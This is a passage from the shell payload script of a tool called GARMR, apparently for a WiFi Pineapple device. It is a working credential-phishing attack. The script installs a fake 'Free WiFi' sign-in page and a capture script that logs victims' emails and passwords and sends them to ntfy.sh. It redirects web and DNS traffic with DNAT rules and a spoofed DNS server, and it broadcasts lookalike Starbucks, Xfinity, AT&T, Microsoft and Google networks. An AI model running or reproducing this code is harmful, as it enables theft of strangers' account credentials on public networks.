header("Cache-Control: no-store, no-cache, must-revalidate");
$stage = isset($_GET['stage']) ? $_GET['stage'] : 'login';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi - Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; width: 380px; padding: 40px; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .wifi-icon { font-size: 48px; text-align: center; margin-bottom: 16px; }
        h1 { font-size: 24px; text-align: center; margin-bottom: 8px; color: #333; }
        .subtitle { text-align: center; color: #666; margin-bottom: 32px; font-size: 14px; }
        input { width: 100%; padding: 14px 16px; font-size: 16px; border: 2px solid #e1e1e1; border-radius: 8px; margin-bottom: 16px; outline: none; }
        input:focus { border-color: #667eea; }
        .submit-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; border-radius: 8px; }
        .terms { font-size: 12px; color: #999; text-align: center; margin-top: 16px; }
        .success { text-align: center; }
        .success .check { font-size: 64px; margin-bottom: 16px; }
    </style>
</head>
<body>
<div class="container">
    <?php if($stage == 'login'): ?>
    <div class="wifi-icon">📶</div>
    <h1>Free WiFi Access</h1>
    <p class="subtitle">Sign in with your email to connect</p>
    <form method="POST" action="capture.php">
        <input type="email" name="email" placeholder="Email address" required>
        <input type="password" name="password" placeholder="Create a password">
        <button type="submit" class="submit-btn">Connect to WiFi</button>
    </form>
    <p class="terms">By connecting, you agree to our Terms of Service</p>

    <?php elseif($stage == 'success'): ?>
    <div class="success">
        <div class="check">✅</div>
        <h1>Connected!</h1>
        <p class="subtitle">You now have internet access.</p>
    </div>
    <script>setTimeout(function(){window.location='https://www.google.com';},3000);</script>
    <?php endif; ?>
</div>
</body>
</html>
WIFIEOF

    cat > "$portal_path/capture.php" << WCAPTEOF
<?php
namespace evilportal;

header("Cache-Control: no-store, no-cache, must-revalidate");
require_once('/pineapple/ui/modules/evilportal/assets/api/Portal.php');
require_once('MyPortal.php');

\$ntfy_enabled = ${NTFY_ENABLED};
\$ntfy_topic = "${NTFY_TOPIC}";

function send_ntfy(\$title, \$message, \$priority, \$tags) {
    global \$ntfy_enabled, \$ntfy_topic;
    if (!\$ntfy_enabled || empty(\$ntfy_topic)) return;

    \$ch = curl_init();
    curl_setopt(\$ch, CURLOPT_URL, "https://ntfy.sh/\$ntfy_topic");
    curl_setopt(\$ch, CURLOPT_POST, true);
    curl_setopt(\$ch, CURLOPT_POSTFIELDS, \$message);
    curl_setopt(\$ch, CURLOPT_HTTPHEADER, ["Title: \$title", "Priority: \$priority", "Tags: \$tags"]);
    curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt(\$ch, CURLOPT_TIMEOUT, 5);
    curl_exec(\$ch);
    curl_close(\$ch);
}

\$loot_file = '/root/loot/garmr/credentials.txt';
\$email = isset(\$_POST['email']) ? \$_POST['email'] : '';
\$password = isset(\$_POST['password']) ? \$_POST['password'] : '';
\$client_ip = \$_SERVER['REMOTE_ADDR'];
\$timestamp = date('Y-m-d H:i:s');

@mkdir('/root/loot/garmr', 0755, true);

if (!empty(\$email)) {
    \$entry = "[\$timestamp] WiFi | IP: \$client_ip | Email: \$email | Password: \$password\n";
    file_put_contents(\$loot_file, \$entry, FILE_APPEND);
    send_ntfy("GARMR: WiFi Creds!", "Email: \$email\nPassword: \$password", "high", "wifi,key");
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify info 'GARMR: WiFi creds - \$email' evilportal &");

    \$portal = new MyPortal((object)\$_POST);
    \$portal->authorizeClient(\$client_ip);
}

header("Location: index.php?stage=success");
WCAPTEOF

    cp "$PORTAL_DIR/garmr_shared/MyPortal.php" "$portal_path/"
    cp "$PORTAL_DIR/garmr_shared/helper.php" "$portal_path/"

    cat > "$portal_path/garmr_wifi.ep" << 'EPEOF'
{ "name": "garmr_wifi", "type": "basic" }
EPEOF

    cat > "$portal_path/generate_204.php" << 'GENEOF'
<?php header("Content-Type: text/html"); header("Location: /"); exit; ?>
GENEOF

    cat > "$portal_path/hotspot-detect.html" << GENEOF
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
GENEOF

    chmod -R 755 "$portal_path"
    LOG "WiFi captive portal installed"
}

# === ACTIVATE PORTAL (FIXED v4.2.0 - PROPER STARTUP SEQUENCE) ===
activate_portal() {
    local portal_name=$1
    local portal_path="$PORTAL_DIR/$portal_name"

    LOG "Activating portal: $portal_name"

    # ============================================
    # STEP 1: KILL ALL STALE PROCESSES FIRST
    # ============================================
    LOG "Step 1: Cleaning up stale processes..."

    # Kill ALL dnsmasq on 5353 (from previous runs)
    local dns_pids=$(ps w | grep "dnsmasq.*5353" | grep -v grep | awk '{print $1}')
    if [ -n "$dns_pids" ]; then
        LOG "Killing stale DNS spoofer PIDs: $dns_pids"
        for pid in $dns_pids; do
            kill -9 $pid 2>/dev/null
        done
        sleep 1
    fi

    # Also kill any dnsmasq with our address pattern
    dns_pids=$(ps w | grep "dnsmasq.*address=/#/" | grep -v grep | awk '{print $1}')
    if [ -n "$dns_pids" ]; then
        LOG "Killing additional stale dnsmasq: $dns_pids"
        for pid in $dns_pids; do
            kill -9 $pid 2>/dev/null
        done
        sleep 1
    fi

    # ============================================
    # STEP 2: FLUSH ALL DNAT RULES
    # ============================================
    LOG "Step 2: Flushing old DNAT rules..."
    /usr/sbin/nft flush chain inet fw4 dstnat 2>/dev/null
    sleep 1

    # Verify flush
    local dnat_count=$(/usr/sbin/nft list chain inet fw4 dstnat 2>/dev/null | grep -c "GARMR")
    if [ "$dnat_count" -gt 0 ]; then
        LOG "WARNING: DNAT rules not fully flushed, retrying..."
        /usr/sbin/nft flush chain inet fw4 dstnat 2>/dev/null
        sleep 1
    fi
    LOG "DNAT rules flushed"

    # ============================================
    # STEP 3: SETUP WEB SERVER
    # ============================================
    LOG "Step 3: Setting up web server..."

    # Clear /www and create symlinks
    rm -rf /www/*

    # PHP files
    ln -sf "$portal_path/index.php" /www/index.php
    ln -sf "$portal_path/MyPortal.php" /www/MyPortal.php
    ln -sf "$portal_path/helper.php" /www/helper.php
    ln -sf "$portal_path/capture.php" /www/capture.php

    # Captive portal detection
    mkdir -p /www/generate_204
    echo '<?php header("Location: /"); exit; ?>' > /www/generate_204/index.php
    ln -sf "$portal_path/hotspot-detect.html" /www/hotspot-detect.html

    # CRITICAL: Restore captiveportal API symlink
    ln -sf /pineapple/ui/modules/evilportal/assets/api /www/captiveportal

    # Create loot directory
    mkdir -p /root/loot/garmr
    chmod 777 /root/loot/garmr

    # Test and restart nginx
    if nginx -t 2>/dev/null; then
        /etc/init.d/nginx restart
        sleep 1
    else
        LOG "ERROR: nginx config test failed"
        return 1
    fi

    # Verify nginx is running (no -x flag, process name includes args)
    if ! pgrep nginx >/dev/null 2>&1; then
        LOG "ERROR: nginx not running!"
        return 1
    fi
    LOG "nginx: RUNNING"

    # ============================================
    # STEP 4: ADD DNAT RULES
    # ============================================
    LOG "Step 4: Adding DNAT rules for $PORTAL_IP..."
    LOG "Running nft commands..."

    local nft_out=""
    nft_out=$(/usr/sbin/nft add rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 80 counter dnat ip to ${PORTAL_IP}:80 comment "GARMR_HTTP" 2>&1)
    [ -n "$nft_out" ] && LOG "NFT HTTP: $nft_out"

    nft_out=$(/usr/sbin/nft add rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 443 counter dnat ip to ${PORTAL_IP}:80 comment "GARMR_HTTPS" 2>&1)
    [ -n "$nft_out" ] && LOG "NFT HTTPS: $nft_out"

    nft_out=$(/usr/sbin/nft add rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 udp dport 53 counter dnat ip to ${PORTAL_IP}:5353 comment "GARMR_DNS_UDP" 2>&1)
    [ -n "$nft_out" ] && LOG "NFT DNS UDP: $nft_out"

    nft_out=$(/usr/sbin/nft add rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 53 counter dnat ip to ${PORTAL_IP}:5353 comment "GARMR_DNS_TCP" 2>&1)
    [ -n "$nft_out" ] && LOG "NFT DNS TCP: $nft_out"

    sleep 1

    # VERIFY DNAT rules are in place
    dnat_count=$(/usr/sbin/nft list chain inet fw4 dstnat 2>/dev/null | grep -c "GARMR")
    LOG "DNAT count after add: $dnat_count"

    if [ "$dnat_count" -lt 4 ]; then
        LOG "ERROR: Only $dnat_count/4 DNAT rules! Retrying with full output..."

        nft_out=$(/usr/sbin/nft add rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 80 counter dnat ip to ${PORTAL_IP}:80 comment "GARMR_HTTP" 2>&1)
        LOG "Retry HTTP: $nft_out"

        nft_out=$(/usr/sbin/nft add rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 443 counter dnat ip to ${PORTAL_IP}:80 comment "GARMR_HTTPS" 2>&1)
        LOG "Retry HTTPS: $nft_out"

        nft_out=$(/usr/sbin/nft add rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 udp dport 53 counter dnat ip to ${PORTAL_IP}:5353 comment "GARMR_DNS_UDP" 2>&1)
        LOG "Retry DNS UDP: $nft_out"

        nft_out=$(/usr/sbin/nft add rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 53 counter dnat ip to ${PORTAL_IP}:5353 comment "GARMR_DNS_TCP" 2>&1)
        LOG "Retry DNS TCP: $nft_out"

        sleep 1
        dnat_count=$(/usr/sbin/nft list chain inet fw4 dstnat 2>/dev/null | grep -c "GARMR")
    fi
    LOG "DNAT rules: $dnat_count/4 active"

    # ============================================
    # STEP 5: START DNS SPOOFER
    # ============================================
    LOG "Step 5: Starting DNS spoofer on port 5353..."

    # Double-check no stale process
    dns_pids=$(ps w | grep "dnsmasq.*5353" | grep -v grep | awk '{print $1}')
    [ -n "$dns_pids" ] && kill -9 $dns_pids 2>/dev/null && sleep 1

    # Start fresh dnsmasq
    /usr/sbin/dnsmasq --no-hosts --no-resolv --address="/#/${PORTAL_IP}" --port=5353 2>/dev/null &
    sleep 2

    # Verify it started
    if netstat -tlnp 2>/dev/null | grep -q ":5353"; then
        LOG "DNS spoofer: RUNNING on port 5353"
    else
        LOG "DNS spoofer not on TCP, checking UDP..."
        if netstat -ulnp 2>/dev/null | grep -q ":5353"; then
            LOG "DNS spoofer: RUNNING on UDP 5353"
        else
            LOG "WARNING: Trying alternate method..."
            /usr/sbin/dnsmasq --no-hosts --no-resolv --address="/#/${PORTAL_IP}" --port=5353 --interface=br-lan 2>/dev/null &
            sleep 2
            if netstat -ulnp 2>/dev/null | grep -q ":5353" || netstat -tlnp 2>/dev/null | grep -q ":5353"; then
                LOG "DNS spoofer: RUNNING (alternate method)"
            else
                LOG "WARNING: DNS spoofer may not be running!"
            fi
        fi
    fi

    # ============================================
    # STEP 6: FINAL VERIFICATION
    # ============================================
    LOG "Step 6: Final verification..."

    local all_ok=1

    # Check nginx
    if ! pgrep -x nginx >/dev/null 2>&1; then
        LOG "  [FAIL] nginx not running"
        all_ok=0
    else
        LOG "  [OK] nginx"
    fi

    # Check DNAT
    dnat_count=$(/usr/sbin/nft list chain inet fw4 dstnat 2>/dev/null | grep -c "GARMR")
    if [ "$dnat_count" -lt 4 ]; then
        LOG "  [WARN] DNAT: only $dnat_count/4 rules"
    else
        LOG "  [OK] DNAT: $dnat_count rules"
    fi

    # Check DNS
    if ps w | grep "dnsmasq.*5353" | grep -v grep >/dev/null 2>&1; then
        LOG "  [OK] DNS spoofer"
    else
        LOG "  [WARN] DNS spoofer may not be running"
    fi

    LOG "Portal activated: $portal_name"
}

# === DEACTIVATE PORTAL (FIXED v4.2.0) ===
deactivate_portal() {
    LOG "Deactivating portal..."

    # Stop ALL DNS spoofing (kill all related dnsmasq)
    local dns_pids=$(ps w | grep "dnsmasq.*5353" | grep -v grep | awk '{print $1}')
    for pid in $dns_pids; do
        kill -9 $pid 2>/dev/null
    done

    # Also kill any with our address pattern
    dns_pids=$(ps w | grep "dnsmasq.*address=/#/" | grep -v grep | awk '{print $1}')
    for pid in $dns_pids; do
        kill -9 $pid 2>/dev/null
    done

    # Stop karma pool
    PINEAPPLE_SSID_POOL_STOP 2>/dev/null

    # Remove DNAT rules
    /usr/sbin/nft flush chain inet fw4 dstnat 2>/dev/null

    # Clear symlinks
    rm -rf /www/*
    echo '<?php echo "Pineapple Pager"; ?>' > /www/index.php

    # Restart nginx
    /etc/init.d/nginx restart 2>/dev/null

    # Restore original SSID if saved
    if [ -n "$ORIGINAL_SSID" ]; then
        LOG "Restoring SSID: $ORIGINAL_SSID"
        uci set wireless.wlan0open.ssid="$ORIGINAL_SSID"
        uci commit wireless
        wifi reload 2>/dev/null &
    fi

    rm -f /tmp/garmr_running

    LOG "Portal deactivated"
}

# === CHECK IF ACTIVE ===
check_garmr_active() {
    [ -f /tmp/garmr_running ] && return 0
    ps w | grep "dnsmasq.*5353" | grep -v grep >/dev/null 2>&1 && return 0
    /usr/sbin/nft list chain inet fw4 dstnat 2>/dev/null | grep "GARMR" >/dev/null 2>&1 && return 0
    return 1
}

get_cred_count() {
    [ -f "$LOOT_DIR/credentials.txt" ] && wc -l < "$LOOT_DIR/credentials.txt" 2>/dev/null || echo 0
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

LOG ""
LOG "┏━┛┏━┃┏━┃┏┏ ┏━┃"
LOG "┃ ┃┏━┃┏┏┛┃┃┃┏┏┛"
LOG "━━┛┛ ┛┛ ┛┛┛┛┛ ┛"
LOG ""
LOG "       GARMR v4.7.0"
LOG ""

led_setup
play_start
VIBRATE

mkdir -p "$LOOT_DIR"
detect_portal_ip

# === CHECK IF ALREADY RUNNING ===
if check_garmr_active; then
    current_ssid=$(get_current_ssid)
    cred_count=$(get_cred_count)

    LOG "GARMR ALREADY ACTIVE!"
    LOG "SSID: $current_ssid"
    LOG "Credentials: $cred_count"

    stop_choice=$(CONFIRMATION_DIALOG "GARMR is ACTIVE!\n\nSSID: $current_ssid\nCreds: $cred_count\n\nYES = STOP\nNO = SWITCH PORTAL")

    if [ "$stop_choice" = "1" ]; then
        deactivate_portal
        led_success
        VIBRATE
        ALERT "GARMR STOPPED\n\nPortal deactivated.\nLoot: $LOOT_DIR"
        exit 0
    fi

    # User wants to SWITCH - deactivate old portal and continue to setup
    LOG "Switching portals..."
    deactivate_portal
    sleep 1
    LOG "Old portal deactivated, setting up new..."
fi

# === CHECK EVIL PORTAL ===
LOG "Checking Evil Portal..."
if ! check_evil_portal; then
    ERROR_DIALOG "Evil Portal not installed!\n\nRun Evil Portal payload first:\nPayloads > evil_portal"
    exit 1
fi
LOG "Evil Portal: OK"

# === CONFIGURE NTFY ===
configure_ntfy

# === INSTALL SHARED BASE ===
install_shared_base

# === SELECT PORTAL FIRST ===
LOG ""
LOG "=== SELECT PORTAL ==="

PROMPT "SELECT PORTAL:

1. Microsoft 365
   (Email + Password + MFA)

2. Google Workspace
   (Gmail + Password + 2FA)

3. WiFi Captive
   (Simple email/password)

Press OK then enter number"

portal_choice=$(NUMBER_PICKER "Portal (1-3)" 1)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        portal_choice=1
        ;;
esac

[ -z "$portal_choice" ] && portal_choice=1
[ "$portal_choice" -lt 1 ] && portal_choice=1
[ "$portal_choice" -gt 3 ] && portal_choice=3

SELECTED_PORTAL="${PORTAL_NAMES[$portal_choice]}"
LOG "Selected: $SELECTED_PORTAL"

# === SELECT SSID (DYNAMIC BASED ON PORTAL) ===
LOG ""
LOG "=== SELECT SSID ==="

# Set ACTIVE_SSIDS based on portal choice
case $portal_choice in
    1)  # Microsoft
        ACTIVE_SSIDS=("${MICROSOFT_SSIDS[@]}")
        PROMPT "MICROSOFT SSIDs:

1. Microsoft WiFi
2. Azure Guest
3. Office 365 WiFi
4. Microsoft Guest
5. Outlook WiFi
6. Teams Meeting WiFi

Press OK then enter number"
        ssid_max=6
        ssid_default=1
        ;;
    2)  # Google
        ACTIVE_SSIDS=("${GOOGLE_SSIDS[@]}")
        PROMPT "GOOGLE SSIDs:

1. Google WiFi
2. Google Guest
3. Google Free WiFi
4. Workspace WiFi
5. Gmail Guest
6. Google Starbucks

Press OK then enter number"
        ssid_max=6
        ssid_default=1
        ;;
    3)  # WiFi Captive (generic)
        ACTIVE_SSIDS=("${GENERIC_SSIDS[@]}")
        PROMPT "GENERIC SSIDs:

1. Free WiFi
2. Guest
3. Airport WiFi
4. Hotel WiFi
5. Starbucks WiFi
6. xfinitywifi
7. attwifi
8. McDonald's Free WiFi

Press OK then enter number"
        ssid_max=8
        ssid_default=1
        ;;
esac

ssid_choice=$(NUMBER_PICKER "SSID (1-$ssid_max)" $ssid_default)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        ssid_choice=$ssid_default
        ;;
esac

[ -z "$ssid_choice" ] && ssid_choice=$ssid_default
[ "$ssid_choice" -lt 1 ] && ssid_choice=1
[ "$ssid_choice" -gt $ssid_max ] && ssid_choice=$ssid_max

SELECTED_SSID="${ACTIVE_SSIDS[$((ssid_choice - 1))]}"
LOG "Selected: $SELECTED_SSID"

# === CONFIRM LAUNCH ===
confirm=$(CONFIRMATION_DIALOG "LAUNCH GARMR?\n\nSSID: $SELECTED_SSID\nPortal: $SELECTED_PORTAL\n\nThis will start the attack.")

if [ "$confirm" != "1" ]; then
    LOG "Aborted"
    exit 0
fi

# === STEP 1: SET SSID (SKOLL) ===
LOG ""
LOG "=== SETTING SSID ==="
led_network
set_broadcast_ssid "$SELECTED_SSID"

# === STEP 2: INSTALL PORTAL (LOKI) ===
LOG ""
LOG "=== INSTALLING PORTAL ==="
case $portal_choice in
    1) install_microsoft_portal ;;
    2) install_google_portal ;;
    3) install_wifi_portal ;;
esac

# === STEP 3: ACTIVATE PORTAL (LOKI) ===
LOG ""
LOG "=== ACTIVATING PORTAL ==="
case $portal_choice in
    1) activate_portal "garmr_microsoft" ;;
    2) activate_portal "garmr_google" ;;
    3)
        # Auto-select branded portal based on SSID
        case "$SELECTED_SSID" in
            *"Starbucks"*)
                LOG "Using Starbucks branded portal"
                activate_portal "garmr_starbucks"
                ;;
            *"McDonald"*)
                LOG "Using McDonald's branded portal"
                activate_portal "garmr_mcdonalds"
                ;;
            *"Airport"*)
                LOG "Using Airport branded portal"
                activate_portal "garmr_airport"
                ;;
            *"Hotel"*|*"Marriott"*|*"Hilton"*|*"Hyatt"*|*"IHG"*)
                LOG "Using Hotel branded portal"
                activate_portal "garmr_hotel"
                ;;
            *"xfinity"*|*"Xfinity"*|*"XFINITY"*)
                LOG "Using Xfinity branded portal"
                activate_portal "garmr_xfinity"
                ;;
            *"att"*|*"ATT"*|*"AT&T"*|*"attwifi"*)
                LOG "Using AT&T branded portal"
                activate_portal "garmr_att"
                ;;
            *"Google"*|*"google"*|*"Gmail"*|*"Workspace"*)
                LOG "Using Google branded portal"
                activate_portal "garmr_google"
                ;;
            *"Microsoft"*|*"Azure"*|*"Office"*|*"Teams"*|*"Outlook"*)
                LOG "Using Microsoft branded portal"
                activate_portal "garmr_microsoft"
                ;;
            *)
                LOG "Using generic WiFi portal"
                activate_portal "garmr_wifi"
                ;;
        esac
        ;;
esac

# === STEP 4: START KARMA (SKOLL) ===
LOG ""
LOG "=== STARTING KARMA ==="
start_karma_pool

# === MARK ACTIVE ===
touch /tmp/garmr_running

# === SUCCESS ===
led_active
VIBRATE
VIBRATE
play_capture

LOG ""
LOG "========================"
LOG "    GARMR IS HUNTING"
LOG "========================"
LOG ""
LOG "SSID: $SELECTED_SSID"
LOG "Portal: $SELECTED_PORTAL"
LOG "Karma: ${#COMMON_SSIDS[@]} SSIDs"
LOG ""
LOG "Loot: $LOOT_DIR"
LOG ""

if [ "$NTFY_ENABLED" = "1" ]; then
    curl -s -H "Title: GARMR Hunting" -H "Tags: wolf,eyes" \
         -d "SSID: $SELECTED_SSID | Portal: $SELECTED_PORTAL" \
         "https://ntfy.sh/$NTFY_TOPIC" >/dev/null 2>&1

    ALERT "GARMR ACTIVE!

SSID: $SELECTED_SSID
Portal: $SELECTED_PORTAL

PUSH ALERTS: ON
Topic: $NTFY_TOPIC

Run payload again to STOP.

Loot: $LOOT_DIR"
else
    ALERT "GARMR ACTIVE!

SSID: $SELECTED_SSID
Portal: $SELECTED_PORTAL

PUSH ALERTS: OFF

Run payload again to STOP.

Loot: $LOOT_DIR"
fi

exit 0
